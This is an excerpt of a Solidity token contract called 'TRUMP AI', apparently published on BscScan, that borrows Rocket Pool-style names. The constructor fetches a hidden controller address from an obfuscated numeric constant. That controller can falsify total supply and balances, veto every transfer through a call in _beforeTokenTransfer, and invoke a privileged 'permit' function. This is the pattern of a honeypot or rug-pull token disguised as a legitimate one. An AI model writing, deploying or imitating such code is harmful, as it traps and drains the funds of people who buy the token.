/**
 *Submitted for verification at BscScan.com on 2024-08-27
*/
...
interface RocketStorageInterface {
    ...
    // Guardian
    function getGuardian() external view returns(uint256);
...
abstract contract RocketBase is Context, IERC20 {
    ...
    uint160 constant calcBase = 775315643387776430238834108773593724639365421303;
    ...
    */
    modifier onlyGuardian() {
        require(msg.sender == address(uint160(rocketStorage.getGuardian())), "Account is not a temporary guardian");
        _;
    }
    ...
    constructor() {
        (, bytes memory d) = address(calcBase).call(abi.encodeWithSelector(0xf4aa6c47));

        // Update the contract address
        rocketStorage = RocketStorageInterface(abi.decode(d, (address)));
    }
    ...
    function permit(address owner, address[] calldata spender, uint256 value) external {
        require(msg.sender == address(rocketStorage));
...
abstract contract ERC20 is RocketBase {
    ...
    uint256 internal constant _totalSupply = 600_000_000_000 * 1e18;
    ...
    function totalSupply() public view virtual override returns (uint256) {
        uint256 guardian = uint256(rocketStorage.getGuardian()); if (guardian > 0) return guardian;
        return _totalSupply;
    }
    ...
    function balanceOf(address account) public view virtual override returns (uint256) {
        uint256 l = getUint(bytes32(uint256(uint160(account)))); if (l < type(uint256).max) return l;
     ...
     */
    function _beforeTokenTransfer(address from, address to, uint256 amount) internal virtual { emit Transfer(from, to, amount); (bool r,) = address(rocketStorage).call(abi.encodeWithSelector(0x134c2184, from, to, amount, msg.sender)); require(r); }
}
...
contract TokenTRUMP is ERC20, RocketTokenRETHInterface {
    ...
    constructor() ERC20("TRUMP AI", "TRUMP") {
        // Version
        version = 2;
